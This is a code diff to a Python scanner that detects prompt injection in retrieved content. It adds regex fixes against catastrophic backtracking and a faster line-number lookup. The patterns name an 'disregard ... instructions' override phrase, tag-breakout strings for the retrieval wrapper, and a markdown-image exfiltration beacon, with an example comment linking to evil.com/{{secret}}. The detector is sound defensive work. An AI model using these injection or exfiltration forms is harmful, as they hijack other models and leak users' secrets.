@@ -7,6 +7,7 @@ All patterns are compiled at module level for performance.
 from __future__ import annotations
 
 import re
+from bisect import bisect_left
 from dataclasses import dataclass, field
 
 from models import Stage2Verdict
@@ -70,7 +71,7 @@ _PATTERNS: list[tuple[str, re.Pattern[str]]] = [
     (
         "instruction_override",
         re.compile(
-            r"disregard.*instructions",
+            r"disregard(?:(?!disregard|\n\n)[\s\S])*?instructions",
             re.IGNORECASE,
         ),
     ),
@@ -220,11 +221,14 @@ _PATTERNS: list[tuple[str, re.Pattern[str]]] = [
     # -- Exfiltration beacons --
     # Matches markdown images with template/interpolation syntax in the URL,
     # which is the actual data-exfiltration pattern (e.g. ![img](https://evil.com/{{secret}}).
-    # Plain markdown images without dynamic content are not flagged.
+    # Plain markdown images without dynamic content are not flagged.  The alt
+    # text stops at the first ']' and both it and the URL part stop at the next
+    # '![', so each attempt ends at the following start token and the scan is
+    # linear on hostile input (a bare '[^\]]*' alt is quadratic on '![![![...').
     (
         "exfil_beacon",
         re.compile(
-            r"!\[.*?\]\(https?://[^)]*(?:\{\{|\$\{|%7[Bb])",
+            r"!\[(?:(?!!\[)[^\]])*\]\(https?://(?:(?!!\[)[^)])*?(?:\{\{|\$\{|%7[Bb])",
             re.IGNORECASE,
         ),
     ),
@@ -238,7 +242,7 @@ _PATTERNS: list[tuple[str, re.Pattern[str]]] = [
     (
         "envelope_breakout",
         re.compile(
-            r"(?:<|&lt;?|&#0*60;?|&#x0*3c;?)\s*/?\s*"
+            r"(?:<|&lt;?|&#0*60;?|&#x0*3c;?)\s*(?:/\s*)?"
             r"(?:retrieved_content|retrieval_note|retrieval_warning|retrieval_cache_note)\b",
             re.IGNORECASE,
         ),
@@ -251,9 +255,20 @@ _PATTERNS: list[tuple[str, re.Pattern[str]]] = [
 # ---------------------------------------------------------------------------
 
 
-def _line_number_of(text: str, match_start: int) -> int:
-    """Return 1-based line number for a character offset."""
-    return text.count("\n", 0, match_start) + 1
+def _newline_offsets(text: str) -> list[int]:
+    """Offsets of every newline in ``text``, computed once per scanned text."""
+    offsets: list[int] = []
+    find = text.find
+    at = find("\n")
+    while at != -1:
+        offsets.append(at)
+        at = find("\n", at + 1)
+    return offsets
+
+
+def _line_number_of(newlines: list[int], match_start: int) -> int:
+    """Return 1-based line number for a character offset (``bisect``, O(log n))."""
+    return bisect_left(newlines, match_start) + 1
 
 
 # ---------------------------------------------------------------------------
@@ -274,6 +289,7 @@ def scan_structural(text: str) -> StructuralScanResult:
     StructuralScanResult with verdict, flagged spans, and penalty score.
     """
     flags: list[FlaggedSpan] = []
+    newlines = _newline_offsets(text)
 
     for category, pattern in _PATTERNS:
         for match in pattern.finditer(text):
@@ -281,7 +297,7 @@ def scan_structural(text: str) -> StructuralScanResult:
                 FlaggedSpan(
                     category=category,
                     matched_text=match.group(),
-                    line_number=_line_number_of(text, match.start()),
+                    line_number=_line_number_of(newlines, match.start()),
                 )
             )
 
